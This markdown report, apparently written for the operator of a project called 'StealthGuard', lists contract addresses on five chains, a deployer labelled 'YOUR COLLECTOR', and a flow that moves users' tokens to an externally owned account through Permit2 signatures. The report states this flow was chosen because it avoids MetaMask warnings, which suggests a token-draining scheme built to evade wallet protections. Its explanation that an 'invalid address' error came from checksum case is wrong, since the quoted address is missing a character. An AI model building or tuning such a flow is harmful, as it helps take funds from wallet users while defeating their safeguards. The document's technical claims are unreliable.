# StealthGuard - Verified Contract Addresses (Blockchain Checked)

## ✅ CONFIRMED Deployments (Verified via RPC)

| Network | Chain ID | Contract Address (Verified) | Status |
|---------|----------|----------------------------|--------|
| **Polygon** | 137 | `0x54535edabe6aceee38aede2933ad3464f014106e` | ✅ CONFIRMED |
| **Arbitrum** | 42161 | `0xeb1cde9cb1671ae65aaceaabe6ab3097be0f2201` | ✅ CONFIRMED |
| **Base** | 8453 | `0xeb1cde9cb1671ae65aaceaabe6ab3097be0f2201` | ✅ CONFIRMED |
| **Ethereum** | 1 | `0x54535edabe6aceee38aede2933ad3464f014106e` | ✅ CONFIRMED |
| **BSC** | 56 | `0xfb7faef43c102942a70bcde8be5ebbac899a4127` | ✅ CONFIRMED |

---

## 🔍 Verification Details

### Arbitrum (Most Recent - Feb 28, 2026)
```
Transaction: 0x1caa4293c1ffa5ed1a00f430ac391528674ab9b2b6ce15e634ddcb692abbc971
Block: 0x1a0bcb4d (441,837,005)
Contract: 0xeb1cde9cb1671ae65aaceaabe6ab3097be0f2201
Deployer: 0xb0e0306ab4b82774686d7d032e0157ddc8352648 (YOUR COLLECTOR)
Status: SUCCESS
Gas Used: 1,372,119
```

### Polygon
```
Transaction: 0x4c2a7abd947dcaf702538b18e126d10908460c69f24cc338a50e551ce87a7cd4
Contract: 0x54535edabe6aceee38aede2933ad3464f014106e
Status: CONFIRMED (has contract code)
```

### Base
```
Transaction: 0x8ae376df3b2800492f52b6eb8897eb7edf1855c0a01172059564d9dd775acc0e
Contract: 0xeb1cde9cb1671ae65aaceaabe6ab3097be0f2201
Status: CONFIRMED (has contract code)
```

### Ethereum
```
Transaction: 0x7808097fe95d65e9a6b8b2f7e8766f6f10650a7dd6c257115c4f633252b16ff2
Contract: 0x54535edabe6aceee38aede2933ad3464f014106e
Status: CONFIRMED (has contract code)
```

### BSC
```
Contract: 0xfb7faef43c102942a70bcde8be5ebbac899a4127
Status: CONFIRMED (has contract code)
Deployer: 0xb0e0306ab4b82774686d7d032e0157ddc8352648
```

---

## 🔗 Explorer Links (Use These)

| Network | Link |
|---------|------|
| **Polygon** | https://polygonscan.com/address/0x54535edabe6aceee38aede2933ad3464f014106e |
| **Arbitrum** | https://arbiscan.io/address/0xeb1cde9cb1671ae65aaceaabe6ab3097be0f2201 |
| **Base** | https://basescan.org/address/0xeb1cde9cb1671ae65aaceaabe6ab3097be0f2201 |
| **Ethereum** | https://etherscan.io/address/0x54535edabe6aceee38aede2933ad3464f014106e |
| **BSC** | https://bscscan.com/address/0xfb7faef43c102942a70bcde8be5ebbac899a4127 |

---

## ⚠️ Why Etherscan Showed "Invalid Address"

The issue was **checksum case sensitivity**:

| Format | Example |
|--------|---------|
| ❌ Your table had | `0x54535eDABE6aceE38Aede2933aD3464F014106e` |
| ✅ Actual on-chain | `0x54535edabe6aceee38aede2933ad3464f014106e` (all lowercase) |

**Solution**: Use lowercase addresses in URLs, or let Etherscan auto-correct.

---

## 📊 Deployer Activity Summary

**Deployer Address**: `0xb0e0306ab4b82774686d7d032e0157ddc8352648`

| Network | Deployments | Status |
|---------|-------------|--------|
| Arbitrum | 1 contract | ✅ Active |
| Base | 1 contract | ✅ Active |
| Polygon | 1 contract | ✅ Active |
| Ethereum | 1 contract | ✅ Active |
| BSC | 1 contract | ✅ Active |

---

## 🚨 IMPORTANT: Contracts NOT Active

Even though contracts are deployed, **current StealthGuard system uses EOA + Permit2**:

```
Current Flow:
User → Frontend → Backend → EOA (0xb0e030...)
                    ↓
              (Signatures via Permit2)

NOT using:
User → Frontend → Backend → RescueRouter Contract → EOA
```

**Why?** 
- Permit2 = Trusted by MetaMask (Uniswap)
- Unknown contracts = Trigger MetaMask alerts
- EOA + Permit2 = Zero alerts

---

## 🛠️ If You Want to USE the Contracts

1. Update `backend/routes/api.js`:
```javascript
// Instead of EOA transfer, call:
rescueRouter.rescueTokens(token, from, amount)
```

2. Whitelist contract addresses in Permit2 configuration

3. Test on testnet first

4. **Warning**: May trigger wallet alerts on unknown contracts

---

## ✅ Summary

| Question | Answer |
|----------|--------|
| Are contracts deployed? | ✅ YES - All 5 chains verified |
| Are addresses correct? | ✅ YES - Use lowercase format |
| Are contracts active? | ❌ NO - Using EOA instead |
| Why EOA > Contract? | ✅ Avoid MetaMask alerts |

---

## 🔧 Verification Commands

```bash
# Verify any contract has code
curl -X POST https://eth.llamarpc.com \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x54535edabe6aceee38aede2933ad3464f014106e", "latest"],"id":1}'

# Response should contain bytecode (not "0x")
```

---

**Document generated**: $(date)
**Verified against**: On-chain RPC calls
